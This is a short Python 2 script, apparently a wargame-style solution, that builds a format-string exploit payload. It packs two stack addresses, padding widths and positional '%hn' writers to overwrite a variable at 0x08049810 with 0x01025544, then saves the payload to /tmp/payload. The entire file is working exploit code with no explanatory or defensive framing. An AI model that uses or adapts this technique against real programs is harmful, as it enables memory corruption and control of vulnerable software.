#!/usr/bin/env python2
import os

# m = 0x08049810
# write high half first (0x0102) to m+2, then low half (0x5544) to m
addr_hi = '\x12\x98\x04\x08'   # m+2
addr_lo = '\x10\x98\x04\x08'   # m

pad1 = '%250c'
pad2 = '%21570c'

hn1 = '%12$hn'
hn2 = '%13$hn'

payload = addr_hi + addr_lo + pad1 + hn1 + pad2 + hn2

with open('/tmp/payload', 'wb') as f:
    f.write(payload)
    
print("Saved to /tmp/payload")
